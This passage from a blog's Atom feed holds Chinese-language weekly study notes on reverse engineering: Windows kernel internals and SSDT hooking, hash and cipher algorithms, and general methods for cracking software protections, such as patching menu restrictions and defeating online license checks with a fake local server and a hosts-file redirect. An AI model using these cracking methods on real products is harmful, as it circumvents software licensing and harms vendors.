  </entry>
  
  <entry>
    <title>2020.04.20-2020.04.26</title>
    <link href="https://brubbish.github.io/45941.html"/>
    <id>https://brubbish.github.io/45941.html</id>
    <published>2020-04-26T07:10:30.000Z</published>
    <updated>2020-07-05T13:30:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows内核基础"><a href="#Windows内核基础" class="headerlink" title="Windows内核基础"></a>Windows内核基础</h1><h2 id="内核理论基础"><a href="#内核理论基础" class="headerlink" title="内核理论基础"></a>内核理论基础</h2><h3 id="Windows-r0和r3通信"><a href="#Windows-r0和r3通信" class="headerlink" title="Windows r0和r3通信"></a>Windows r0和r3通信</h3><p>当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。<br>当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。<br><a id="more"></a><br>ntdll.dll中的函数时成对出现的，分别以“nt”和“zw”开头，如ntcreatefile、zwcreatefile<br>从用户模式调用nt<em> 和zw</em> api,连接ntdll.lib：<br>&emsp;&emsp;二者都是通过设置系统服务表中的索引和在栈中设置参数，通过sysenter或syscall指令进入内核态，并最终跳转到kiservicetable对应的系统服务例程中。代码会严格检查从用户空间传入的参数<br>从内核模式调用nt<em> 和zw</em> api,连接ntdll.lib：<br>&emsp;&emsp;nt<em> api将直接调用对应函数，zw</em> api通过kisystemservice跳转到对应的函数代码<br>调用nt<em> api时不会改变previous mode（分为用户态和内核态）的状态；调用zw</em> api时会将previous mode 改为内核态。使用zw* api可以避免额外的参数列表检查，提高效率  </p><p>内核主要由各种驱动（在磁盘上时.sys文件）组成，有的是系统自带的，有的是软件厂商提供的。驱动加载后会生成对应的设备对象，并可以选择向r3提供一个可供访问和打开的符号链接<br>应用层程序可以根据符号链接调用CreateFile()函数打开，在获得句柄后，程序就可以调用应用层函数与内核驱动进行通信<br>&emsp;&emsp;符号链接（软链接）：a symbolic link is a file that links to another file or directory using its path.然后大概是路径可以自动变的快捷方式…吧<br>内核驱动执行DriverEntry()函数后就可以接受r3层的通信请求了。内核驱动中专门有一组函数用于响应应用层的调用请求   </p><h3 id="内核函数"><a href="#内核函数" class="headerlink" title="内核函数"></a>内核函数</h3><p>前缀：<br><img src="https://s1.ax1x.com/2020/04/24/JDmOoR.png" alt=" "></p><p>调用内核函数要注意它的中断请求级别（IRQL,Interrupt Request Level）要求。内核在不同情况下会运行在不同的IRQL级别上，此时必须调用符合该级别的内核函数</p><p><img src="https://s1.ax1x.com/2020/04/24/JD0lBd.png" alt=" "></p><p>passive_level：最低级别，对所有中断都可以做出响应，<strong>用户模式代码都运行在该中断级别上</strong>，可以访问分页内存<br>apc_level：只有apc级别的中断可以被屏蔽，可以访问分页内存，分页调度管理就运行在该级别上<br>dispatch_level:该级别和更低的中断被屏蔽，不能访问分页内存，只能处理不可分页的内存，因此在这个级别上能访问的api大大减少。线程调度运行在该级别上。线程调度用于执行多任务，由时钟中断来保证，因此该级别的中断即是调度中断。这个级别对一些严重中断不进行处理，所以要慎重使用（emmm….)<br>DIRQL（Device IRQL）：IRQL的最高级别，在该级别上的中断都会被忽略，通常用于判断设备优先级</p><ul><li>分页内存：<br>在保护模式中，内存访问使用分段机制，即”段基址:段内偏移地址”；操作系统将一些进程不常用的内存放到硬盘中，腾出内存空间，在一定程度上解决了内存不足的问题，但如果内存特别小，就会无法容纳任何一个进程的段。这个问题的原因是在只有分段的情况下，cpu认为线性地址等于物理地址，所以物理地址也必须要连续，但实际上可用的物理地址不连续。为了解决这个问题，需要让物理地址和线性地址重新建立映射，让前者不连续，后者连续，由此引出内存分页机制<br>分页机制建立在分段机制的基础上，因此分页在分段后进行。在内存分页机制下，由“段基址:段内偏移地址”得到的线性地址不是物理地址而是虚拟地址，对应的物理地址要在页表中查找。<br>分页机制提供连续线性地址到不连续物理地址的映射，以及用大小相等的页代替大小不相等的段</li></ul><h3 id="内核驱动模块"><a href="#内核驱动模块" class="headerlink" title="内核驱动模块"></a>内核驱动模块</h3><p>内核驱动扩展名为.sys   </p><ul><li>驱动的加载和执行<br>创建一个服务（注册表），在services键下（….\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\）建立一个与驱动名称相关的服务键，服务键规定了驱动的一些属性，如加载的先后等<br>对象管理器生成驱动对象，并传递给DriverEntry()函数，执行DriverEntry()函数。（DriverEntry()是驱动执行的入口函数）<br>创建控制设备对象；创建控制设备符号链接；如果是过滤驱动，则创建过滤设备对象并绑定<br>注册特定的分发派遣函数<br>其他初始化动作，如hook、过滤（如文件过滤、防火墙过滤）等的注册和 初始化   </li></ul><p>&emsp;*过滤驱动就是挂载在其他驱动上，对某设备的irp(I/O Request Package)进行拦截过滤作用，可以对设备进行功能扩展，或是数据加密等的驱动程序。</p><h2 id="内核的数据结构"><a href="#内核的数据结构" class="headerlink" title="内核的数据结构"></a>内核的数据结构</h2><h3 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h3><p>内核对象是一种Windows内核中的数据结构管理机制。应用层的进程、线程、文件、等对象或打开的句柄在内核中都有对应的内核对象<br>一个内核对象可以分为对象头和对象体。对象头中至少有一个OBJECT_HEADER和对象额外信息。对象体紧接着对象头中的OBJECT_HEADER。一个指针总是指向对象体而不是对象头，将对象体指针减去偏移值，获得OBJECT_HEADER的结构，从而访问其他对象结构辅助信息<br><img src="https://s1.ax1x.com/2020/04/26/JcAJKO.png" alt=" "><br>内核对象分为：  </p><ol><li>Dispatcher对象<br>在对象体开始位置放置了一个共享的公共数据结构DISPATCHER_HEADER，包含了这个结构的内核对象名字都以K开头（但K开头的不一定都是这个对象），这些内核对象都是可以等待的（(waitable):①当到达某一个时间后，才继续线程的执行。/②当到达某一个时间后，调用某一个函数，而且间隔多少时间后，再次调用。）   </li><li>io对象<br>在开始位置不放置DISPATCHER_HEADER，但通常放置一个与type和size有关的整型成员。   </li><li>其他对象<br>包括进程对象(EPROCESS)和线程对象(ETHREAD)等<br>EPROCESS用于管理进程的各种信息，每一个进程都对应一个EPROCESS结构，用于记录进程执行期间的各种数据。<br>第一个成员是进程的对象KPROCESS，所有进程的EPROCESS内核结构都被放入一个双向链表，R3在枚举系统进程的时候，通过遍历这个链表获得了进程的列表   </li></ol><p>ETHREAD结构是线程的内核管理对象，每一个线程都有一个对应的ETHREAD结构。结构的第一个成员是线程对象KTHREAD，所有的ETHREAD结构也被放在一个双向链表里<br><img src="https://s1.ax1x.com/2020/04/26/JcAYrD.png" alt=" ">   </p><h3 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h3><p>“system services descriptor table”, 在内核中的实际名称是”KeServiceDscriptorTable”<br>用于处理应用层通过Kernel32.dll下发的各个api操作请求。当kernel32.dll的api通过ntdll.dll时，会先完成对参数的检查，在调用一个中断，从而实现r3层进入r0层。</p><p>SSDT表中最重要的两个成员为ServiceTableBase（表的基地址）和NumberOfServices（系统中SSDT服务函数的个数）<br>由ssdt表的基地址和ssdt函数的索引号可以求出对应的服务函数的地址（32位和64位计算公式不同）   </p><h4 id="Shadow-SSDT"><a href="#Shadow-SSDT" class="headerlink" title="Shadow SSDT"></a>Shadow SSDT</h4><p>原理和SSDT类似，对应的表名为KeServiceDscriptorTable<strong>Shadow</strong>，是内核未导出（不能在自己的模块中导入和直接引用）的一张表，包含Ntoskrnel.exe和win32.sys服务函数。<br>hook该表中的某些函数可以实现截屏保护、模拟按键、防止窗口被关闭等   </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Windows内核基础&quot;&gt;&lt;a href=&quot;#Windows内核基础&quot; class=&quot;headerlink&quot; title=&quot;Windows内核基础&quot;&gt;&lt;/a&gt;Windows内核基础&lt;/h1&gt;&lt;h2 id=&quot;内核理论基础&quot;&gt;&lt;a href=&quot;#内核理论基础&quot; class=&quot;headerlink&quot; title=&quot;内核理论基础&quot;&gt;&lt;/a&gt;内核理论基础&lt;/h2&gt;&lt;h3 id=&quot;Windows-r0和r3通信&quot;&gt;&lt;a href=&quot;#Windows-r0和r3通信&quot; class=&quot;headerlink&quot; title=&quot;Windows r0和r3通信&quot;&gt;&lt;/a&gt;Windows r0和r3通信&lt;/h3&gt;&lt;p&gt;当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。&lt;br&gt;当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。&lt;br&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>2020.04.13-2020.04.19</title>
    <link href="https://brubbish.github.io/32820.html"/>
    <id>https://brubbish.github.io/32820.html</id>
    <published>2020-04-19T07:10:30.000Z</published>
    <updated>2020-07-05T13:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="单向散列算法"><a href="#单向散列算法" class="headerlink" title="单向散列算法"></a>单向散列算法</h2><h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值   </p><h4 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h4><p>原始消息长度不能超过2^64<br>sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)<br><a id="more"></a><br>sha-1初始散列值用5个32位双字进行初始化，如图：<br><img src="https://s1.ax1x.com/2020/04/14/GzwQKK.png" alt=" "><br>运算时使用到的常数：<br><img src="https://s1.ax1x.com/2020/04/14/GzwlDO.png" alt=" "><br>用以上两组数识别sha-1算法   </p><h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><p>加密和解密的密钥完全相同<br>安全性依赖于：</p><ol><li>加密算法足够强，无法根据密文直接获得原文  </li><li>密钥的秘密性  </li></ol><p>在使用时，把用户输入的注册码（或注册码的一部分等）作为算法的密钥。如果在检查注册码时把用户的输入作为算法的输出或输入，解密者都可以找到所用的密钥<br>常用的对称分组加密算法有：DES、IDEA、AES等   </p><p>对称密码分为：</p><ol><li>流密码：对每一个比特都作为基本处理单元进行加密</li><li>块密码（分组密码）：先分块，再对每一块进行加密<h3 id="RC4流密码"><a href="#RC4流密码" class="headerlink" title="RC4流密码"></a>RC4流密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4>生成一种伪随机流（称为密钥流），与长度相同的明文通过异或（相同为假，不同为真）操作进行加密；解密时也与密文进行异或操作<br>密钥流分为KSA和PRGA两部分   </li><li>KSA（the key-scheduling algorithm)   <ol><li>先对一个256字节的数组S进行初始化，按顺序填入0~255    </li><li>如果输入的密钥长度小于256字节，则按密钥的填充输入的密钥（如输入1，2，3，4，5，填为1，2，3，4，5，1，2，3，…  放入数组T</li><li>对1中数组元素做如下交换<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        　j = <span class="number">0</span>;</span><br><span class="line">    　  　<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">256</span> ; i++)&#123;</span><br><span class="line">      　　　　j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">      　　　　swap(S[i] , S[j]);</span><br><span class="line">      　　&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><ol><li>PRGA（the pseudo-random gerneration algorithm)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123;<span class="comment">//明文长度datalength</span></span><br><span class="line">　　　i = (i + <span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">　　　　j = (j + S[i]) mod <span class="number">256</span>;</span><br><span class="line">　　　　swap(S[i] , S[j]);</span><br><span class="line">　　　　t = (S[i] + S[j]) mod <span class="number">256</span>;</span><br><span class="line">　　　　k = S[t];<span class="comment">//这里的K就是当前生成的一个秘钥流中的一位</span></span><br><span class="line">　　　　<span class="comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="公开密钥加密算法"><a href="#公开密钥加密算法" class="headerlink" title="公开密钥加密算法"></a>公开密钥加密算法</h2><p>亦称非对称加密算法。在加密与解密时用不同的密钥，加密用的密钥叫做公钥，解密用的密钥叫做私钥<br>公开密钥的设计基于<a href="https://blog.csdn.net/qq_21768483/article/details/80430590" target="_blank" rel="noopener">NP完全问题</a>   </p><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>算法的安全性依赖于大整数因式分解（主要是分解n），密钥位数越长就越安全</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol><li>选取两个较大素数p，q（用算法随机产生两个数，使用概率算法来验证是否质数。假如通过了这个测试的话，那么要使用一个精确的测试来保证的确是质数。）且pq不能太接近  </li><li>n=pq，n称为模  </li><li>计算欧拉函数φ(n)=(p-1)(q-1)  </li><li>选取加密密钥e，e常用值为3、7和（2^16+1)  </li><li>使用扩展欧几里得算法，求出d  </li><li>公钥为e和n；私钥为d；p，q必须保密  </li><li>把消息进行分组，每组长度比n小，将每组都根据公式进行加密的计算  </li><li>解密时，取每一个分组按公式进行解密</li></ol><h2 id="Base64算法"><a href="#Base64算法" class="headerlink" title="Base64算法"></a>Base64算法</h2><p>将二进制数据编码为字母和数字，用于非文本传输。使用ASCII（A~/)第65个字符为“=”），并用6个进制位表示一个可显示字符<br>编码时：</p><ol><li>将第一个字节放置于24位缓冲区的高8位，第二个字节放在中间的8位，第三个字节放在低8位（少于3个字节，相应的缓冲区置0）</li><li>对24位缓冲区以6位为一组作为索引，高位优先，从ASCII表取出对应数值的元素进行输出,置0的位置输出“=” </li></ol><p>如：对单词sky：<br><img src="https://s1.ax1x.com/2020/04/17/JZN1ER.png" alt=" "><br><img src="https://s1.ax1x.com/2020/04/17/JZdBVJ.jpg" alt=" "><br>再根据28-&gt;c;54-&gt;2;…..<br>得到sky对应的base64编码   </p><p>在url和cookie里“=”会造成歧义，因此很多base64编码在最后会把”=”去掉。<br>因为<strong>base64编码的长度永远是4的倍数</strong>，所以可以确定少了几个“=”   </p><h2 id="加密算法在软件保护的应用"><a href="#加密算法在软件保护的应用" class="headerlink" title="加密算法在软件保护的应用"></a>加密算法在软件保护的应用</h2><p>不仅包括软件的注册激活系统、软件的防逆向，还包括软件涉及的数据的安全保护，包括存储数据的加密和数据交换的加密协议，如聊天软件的加密协议、游戏客户端与服务器通信的协议包、智能硬件和app通信的命令协议等<br>高等难度级别的保护方案可以设计得简单也可以复杂：<br>简单：例如对用户名处理时把哈希、对称、公钥算法全都用上，或者用难以分析的算法例如ecdsa。流程很简单但破解门槛很高<br>复杂：可以使用不常见的算法（没有特征）、使用自己的算法，如果用公开的算法库，要去掉一些特征字符串，从而识别不出用了哪个算法库   </p><h1 id="Windows内核"><a href="#Windows内核" class="headerlink" title="Windows内核"></a>Windows内核</h1><p>操作系统一般分为应用层和内核层，应用层通过系统调用进入内核，由系统底层完成相应功能；内核处理某些硬件发来的中断请求，代替硬件完成某些功能</p><h2 id="内核理论基础"><a href="#内核理论基础" class="headerlink" title="内核理论基础"></a>内核理论基础</h2><h3 id="权限级别"><a href="#权限级别" class="headerlink" title="权限级别"></a>权限级别</h3><p>cpu的运行级别依次为R0（最高执行权限）、R1、R2、R3（最低执行权限），r0运行内核，r1、r2运行设备驱动，r3运行应用程序。为了让工作变得简单，现在cpu和操作系统只保留了r0和r3，驱动运行在r0级    </p><h3 id="内存空间布局"><a href="#内存空间布局" class="headerlink" title="内存空间布局"></a>内存空间布局</h3><p>32位寻址支持2^32B（4GB）的虚拟内存空间，其中系统的内存主要分为内核空间和应用层空间，每部分约占2GB，还有64kb的null空间和非法区域<br>64位理论支持最大2^64kb的寻址空间，但因为太大用不完所以只支持到40多位（….顺便32位和64位cpu地址总线不一定是32/64，32位通过PAE扩展到36位；64位只有4x位）    </p><h3 id="Windows启动过程"><a href="#Windows启动过程" class="headerlink" title="Windows启动过程"></a>Windows启动过程</h3><ol><li>自检<br>从bios载入指令，进行硬件的初始化检查  </li><li>初始化启动<br>根据cmos的设置，bios加载启动盘，将主引导记录（mbr）[1]中的引导代码载入内存。启动代码搜索mbr中的分区表,找出活动分区，将引导代码载入内存。引导代码查找并启动ntldr文件，bios将控制权转移给ntldr   </li><li>boot加载   <ol><li>设置内存模式</li><li>启动文件系统，定位boot.ini等启动文件</li><li>读取boot.ini </li></ol></li><li>检测和配置硬件<br>检查和配置硬件设备如系统固件、适配器、输入设备等</li><li>内核加载<ol><li>加载系统内核的ntoskrnl.exe[2]和硬件抽象层（HAL,内核与硬件电路之间的接口层)。</li><li>从注册表读取安装的驱动程序，然后依次加载</li></ol></li><li>Windows会话管理启动<br>会话管理器程序：smss.exe，是系统第一个创建的用户模式进程  </li><li>用户登录<br>由winlogon.exe系统服务提供，完成：  <ol><li>启动服务子系统，即服务控制管理器</li><li>启动本地安全授权过程</li><li>显示登录界面</li></ol></li></ol><p>用bios和mbr的启动方式具有局限性，新的系统引导方式用UEFI和GPT。<br>UEFI（统一的可扩展固件接口）突破了读取分区容量最高仅为2tb的限制；并且UEFI本身相当于一个微型操作系统，可以直接读取FAT分区中的文件，程序员可以开发出直接在UEFI下运行的程序。因此可以将Windows安装程序做成efi类型的应用程序，从而不需要主引导记录、活动分区等，就可以启动Windows<br>GPT（全局唯一标识分区表）可以对分区数量没有限制（Windows限制在128个以内），可管理磁盘大小为18eb，只有基于uefi平台的主板才支持gpt分区引导启动</p><p>[1]: Master Boot Record，包括启动代码、硬盘分区表、结束标志字，包含MBR引导代码的扇区称为主引导扇区<br>[2]: Windows NT operating system kernel,为内核空间提供内核和执行层，并负责一些系统服务</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;加密算法&quot;&gt;&lt;a href=&quot;#加密算法&quot; class=&quot;headerlink&quot; title=&quot;加密算法&quot;&gt;&lt;/a&gt;加密算法&lt;/h1&gt;&lt;h2 id=&quot;单向散列算法&quot;&gt;&lt;a href=&quot;#单向散列算法&quot; class=&quot;headerlink&quot; title=&quot;单向散列算法&quot;&gt;&lt;/a&gt;单向散列算法&lt;/h2&gt;&lt;h3 id=&quot;SHA算法&quot;&gt;&lt;a href=&quot;#SHA算法&quot; class=&quot;headerlink&quot; title=&quot;SHA算法&quot;&gt;&lt;/a&gt;SHA算法&lt;/h3&gt;&lt;p&gt;安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值   &lt;/p&gt;
&lt;h4 id=&quot;SHA-1算法&quot;&gt;&lt;a href=&quot;#SHA-1算法&quot; class=&quot;headerlink&quot; title=&quot;SHA-1算法&quot;&gt;&lt;/a&gt;SHA-1算法&lt;/h4&gt;&lt;p&gt;原始消息长度不能超过2^64&lt;br&gt;sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)&lt;br&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>2020.04.06-2020.04.12</title>
    <link href="https://brubbish.github.io/51835.html"/>
    <id>https://brubbish.github.io/51835.html</id>
    <published>2020-04-12T04:10:30.000Z</published>
    <updated>2020-07-05T13:30:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="菜单功能限制"><a href="#菜单功能限制" class="headerlink" title="菜单功能限制"></a>菜单功能限制</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>要将软件菜单和窗口变得不可用，可用以下函数   </p><ol><li>EnableMenultem()<br>允许或进制指定的菜单条目<br>参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）<br>返回值：返回菜单以前的状态  </li><li>EnableWindow()<br>允许或禁止指定窗口<br>参数：窗口句柄、true/false<br>返回值：0表示失败，非0表示成功  <a id="more"></a><h2 id="拆解菜单限制保护"><a href="#拆解菜单限制保护" class="headerlink" title="拆解菜单限制保护"></a>拆解菜单限制保护</h2>修改控制标志或true/false  <h1 id="KeyFile保护"><a href="#KeyFile保护" class="headerlink" title="KeyFile保护"></a>KeyFile保护</h1>付费后将作者提供的注册文件keyfile放到指定目录下可用让软件成为正版<br>软件每次启动时都会读取该文件，然后利用某种算法进行处理，以此判断结果是否正确  <h2 id="相关api函数"><a href="#相关api函数" class="headerlink" title="相关api函数"></a>相关api函数</h2>|api函数|作用|<br>-|-<br>FindFirstA|确定文件是否存在<br>CreateFileA、_lopen|确定文件是否存在；打开文件获得其句柄<br>GetFileSizeA、GetFileEx|获得文件的大小<br>GetFileSize、GetFileAttributesExA|获得文件的属性<br>SetFilePointer、GetFilePointerEx|移动文件指针<br>ReadFile|读取文件内容  </li></ol><h1 id="网络验证"><a href="#网络验证" class="headerlink" title="网络验证"></a>网络验证</h1><p>思路是拦截服务器返回的数据包，分析程序是如何处理数据包的   </p><h2 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h2><p>常用的有send()、recv()【这两个是socket（套接字，计算机之间进行通信的一种约定或一种方式）函数】、WSASend()、WSARecv()等   </p><h2 id="破解网络验证的一般思路"><a href="#破解网络验证的一般思路" class="headerlink" title="破解网络验证的一般思路"></a>破解网络验证的一般思路</h2><p>如果验证的数据包内容固定，可以抓取数据包，写一个本地服务端模拟服务器<br>如果不固定则需要找出相应的算法   </p><ol><li>分析发送的数据包<br>在od中对send()之类的函数设断，分析加密的位置和方式  </li><li>分析接收的数据包<br>客户端程序使用recv()之类的函数接收数据，然后进行解密。对解密后数据存放的地址下内存读断点  </li><li>解除网络验证<br>编写一个服务端，模拟服务器来接收和发送数据<br>如果软件用域名登陆服务器，可以修改hosts，使域名指向本地<br>如果软件用ip地址连接服务器，可以用inet_addr或connect等设断，将ip地址修改为本地ip地址，或用代理软件将ip地址指向本地  </li></ol><p>网络验证的关键是数据包分析  </p><h1 id="常用断点设置"><a href="#常用断点设置" class="headerlink" title="常用断点设置"></a>常用断点设置</h1><p><img src="https://s1.ax1x.com/2020/04/09/GInJdU.png" alt=" "> </p><h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="单向散列算法"><a href="#单向散列算法" class="headerlink" title="单向散列算法"></a>单向散列算法</h2><p>即hash算法，是将任意长度的消息压缩到某一固定长度的函数（不可逆）<br>因为是不可逆算法，只能使用hash函数作为加密的一个中间步骤。如，对用户名进行hash变换，再用这个结果进行可逆的加密变换，生成注册码  </p><h3 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h3><p>MD5消息摘要算法<br>对任意长度的消息进行运算，产生128位的消息摘要  </p><h4 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h4><ol><li>数据填充<br>填充消息，使消息长度（bit）对512求余的结果等于448【比512的倍数小64位】（本身满足了也要）。方法是：附一个1在后面，然后用0来填充。  </li><li>添加长度<br>在结尾用64位记录原文长度，最终消息长度是512的整数倍  </li><li>初始化变量<br>MD5的结果按32位一组分成4组，由4个寄存器（A、B、C、D）进行演变得到<br>寄存器初始值为：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">原本应为：</span><br><span class="line">A&#x3D;0x01234567</span><br><span class="line">B&#x3D;0x89ABCDEF</span><br><span class="line">C&#x3D;0xFEDCBA98</span><br><span class="line">D&#x3D;0x76543210</span><br><span class="line">为了在内存中也长那样↑，所以要调整成：</span><br><span class="line">A &#x3D; 0x67452301;</span><br><span class="line">B &#x3D; 0xEFCDAB89;</span><br><span class="line">C &#x3D; 0x98BADCFE;</span><br><span class="line">D &#x3D; 0x10325476;</span><br></pre></td></tr></table></figure></li><li>数据处理<br>4个辅助函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F(X, Y, Z) &#x3D;(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X, Y, Z) &#x3D;(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X, Y, Z) &#x3D;X^Y^Z</span><br><span class="line">I(X, Y, Z)&#x3D;Y^(X|(~Z))</span><br></pre></td></tr></table></figure><img src="https://s1.ax1x.com/2020/04/09/GInbFg.png" alt="流程"><br>将ABCD的副本abcd中的3个经过运算后与第四个相加，再加上两个常数，并将所得的值<strong>循环左移</strong>s位，最后将所得结果加上abcd之一，回送至ABCD（一次子循环）  </li></ol><ul><li>执行的函数和次数：<br>先执行16次F,再执行16次G….共64次（每次主循环）<br>主循环次数：原文长度/512（全部消息）</li><li>相加的两个常数：<br>一个是<strong>利用第2步的原文</strong>，将其等分成16份（每份长度为32位），循环使用其中一份。<br>另一个是4^32*abs(sin(i))得到的整数部分,在第i步中，i用弧度表示。目的是用正弦函数和幂函数消除变换中的线性  </li><li>循环左移位数s：有个表<br><img src="https://s1.ax1x.com/2020/04/12/GLmJmj.png" alt=" "></li></ul><ol><li>输出</li></ol><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用peid插件krypto analyzer分析，得知程序含有md5的迭代常数，可以猜测使用了md5算法<br>输入的注册码后进行长度等的判断以及数据初步处理：<br><img src="https://s1.ax1x.com/2020/04/12/GLmt7n.png" alt=""><br>上图call的地址里的代码，通过mov的4个数判断在进行md5初始化：<br><img src="https://s1.ax1x.com/2020/04/12/GLmY0s.png" alt="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法" title="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法">   </p><h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>只看了一点，就放到下周的周报上了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;菜单功能限制&quot;&gt;&lt;a href=&quot;#菜单功能限制&quot; class=&quot;headerlink&quot; title=&quot;菜单功能限制&quot;&gt;&lt;/a&gt;菜单功能限制&lt;/h1&gt;&lt;h2 id=&quot;相关函数&quot;&gt;&lt;a href=&quot;#相关函数&quot; class=&quot;headerlink&quot; title=&quot;相关函数&quot;&gt;&lt;/a&gt;相关函数&lt;/h2&gt;&lt;p&gt;要将软件菜单和窗口变得不可用，可用以下函数   &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EnableMenultem()&lt;br&gt;允许或进制指定的菜单条目&lt;br&gt;参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）&lt;br&gt;返回值：返回菜单以前的状态  &lt;/li&gt;
&lt;li&gt;EnableWindow()&lt;br&gt;允许或禁止指定窗口&lt;br&gt;参数：窗口句柄、true/false&lt;br&gt;返回值：0表示失败，非0表示成功
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>2020.03.30-2020.04.05</title>
    <link href="https://brubbish.github.io/20849.html"/>
    <id>https://brubbish.github.io/20849.html</id>
    <published>2020-04-05T12:06:00.000Z</published>
    <updated>2020-07-05T13:30:30.000Z</updated>
    
